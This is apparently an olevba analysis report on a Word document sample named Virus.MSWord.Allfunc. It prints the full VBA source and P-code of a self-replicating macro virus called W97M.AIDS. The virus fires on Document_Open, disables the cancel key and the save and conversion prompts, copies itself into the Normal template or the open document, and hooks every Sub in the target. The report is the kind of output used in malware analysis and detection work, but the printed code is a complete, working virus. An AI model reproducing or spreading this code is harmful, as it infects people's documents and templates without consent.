olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Allfunc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Allfunc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Function AIDS()
Application.EnableCancelKey = wdCancelDisabled
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Set TD = ThisDocument.VBProject.VBComponents
For FindCode = 1 To TD.Count
If TD.Item(FindCode).CodeModule.CountOfLines > 0 Then
For CodeLines = 1 To TD.Item(FindCode).CodeModule.CountOfLines
If TD.Item(FindCode).CodeModule.Lines(CodeLines, 1) = "Private Function AIDS()" Then
MyCode = TD.Item(FindCode).CodeModule.Lines(CodeLines, 32)
End If
Next
End If
Next
If ThisDocument = ActiveDocument Then Set Target = NormalTemplate Else Set Target = ActiveDocument
Set TargetComp = Target.VBProject.VBComponents
For TargetModule = 1 To TargetComp.Count
If TargetComp.Item(TargetModule).CodeModule.CountOfLines > 0 Then
For CodeLines = 1 To TargetComp.Item(TargetModule).CodeModule.CountOfLines
If TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1) = "Private Function AIDS()" Then End
Next
For CodeLines = 1 To TargetComp.Item(TargetModule).CodeModule.CountOfLines
If Left(TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1), 12) = "Private Sub " Then
TargetComp.Item(TargetModule).CodeModule.ReplaceLine CodeLines, TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1) & ": AIDS"
ElseIf Left(TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1), 4) = "Sub " Then
TargetComp.Item(TargetModule).CodeModule.ReplaceLine CodeLines, TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1) & ": AIDS"
End If
Next
TargetComp.Item(TargetModule).CodeModule.AddFromString MyCode
End If
Next
End Function
Private Sub Document_Open(): AIDS
End Sub
'Do Not Distribute
'Name = W97M.AIDS
'Author = Lys Kovick
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Allfunc
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3154 bytes
' Line #0:
' 	FuncDefn (Private Function AIDS(id_FFFE As Variant))
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #4:
' 	SetStmt 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set TD 
' Line #5:
' 	StartForVariable 
' 	Ld FindCode 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TD 
' 	MemLd Count 
' 	For 
' Line #6:
' 	Ld FindCode 
' 	Ld TD 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #7:
' 	StartForVariable 
' 	Ld CodeLines 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld FindCode 
' 	Ld TD 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #8:
' 	Ld CodeLines 
' 	LitDI2 0x0001 
' 	Ld FindCode 
' 	Ld TD 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "Private Function AIDS()"
' 	Eq 
' 	IfBlock 
' Line #9:
' 	Ld CodeLines 
' 	LitDI2 0x0020 
' 	Ld FindCode 
' 	Ld TD 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St MyCode 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	StartForVariable 
' 	Next 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	StartForVariable 
' 	Next 
' Line #14:
' 	Ld ThisDocument 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Target 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Target 
' 	EndIf 
' Line #15:
' 	SetStmt 
' 	Ld Target 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set TargetComp 
' Line #16:
' 	StartForVariable 
' 	Ld TargetModule 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TargetComp 
' 	MemLd Count 
' 	For 
' Line #17:
' 	Ld TargetModule 
' 	Ld TargetComp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #18:
' 	StartForVariable 
' 	Ld CodeLines 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TargetModule 
' 	Ld TargetComp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #19:
' 	Ld CodeLines 
' 	LitDI2 0x0001 
' 	Ld TargetModule 
' 	Ld TargetComp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "Private Function AIDS()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #20:
' 	StartForVariable 
' 	Next 
' Line #21:
' 	StartForVariable 
' 	Ld CodeLines 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TargetModule 
' 	Ld TargetComp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #22:
' 	Ld CodeLines 
' 	LitDI2 0x0001 
' 	Ld TargetModule 
' 	Ld TargetComp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000C 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x000C "Private Sub "
' 	Eq 
' 	IfBlock 
' Line #23:
' 	Ld CodeLines 
' 	Ld CodeLines 
' 	LitDI2 0x0001 
' 	Ld TargetModule 
' 	Ld TargetComp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 ": AIDS"
' 	Concat 
' 	Ld TargetModule 
' 	Ld TargetComp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #24:
' 	Ld CodeLines 
' 	LitDI2 0x0001 
' 	Ld TargetModule 
' 	Ld TargetComp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0004 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0004 "Sub "
' 	Eq 
' 	ElseIfBlock 
' Line #25:
' 	Ld CodeLines 
' 	Ld CodeLines 
' 	LitDI2 0x0001 
' 	Ld TargetModule 
' 	Ld TargetComp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 ": AIDS"
' 	Concat 
' 	Ld TargetModule 
' 	Ld TargetComp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	StartForVariable 
' 	Next 
' Line #28:
' 	Ld MyCode 
' 	Ld TargetModule 
' 	Ld TargetComp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	StartForVariable 
' 	Next 
' Line #31:
' 	EndFunc 
' Line #32:
' 	FuncDefn (Private Sub Document_Open())
' 	BoS 0x0000 
' 	ArgsCall AIDS 0x0000 
' Line #33:
' 	EndSub 
' Line #34:
' 	QuoteRem 0x0000 0x0011 "Do Not Distribute"
' Line #35:
' 	QuoteRem 0x0000 0x0010 "Name = W97M.AIDS"
' Line #36:
' 	QuoteRem 0x0000 0x0013 "Author = Lys Kovick"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

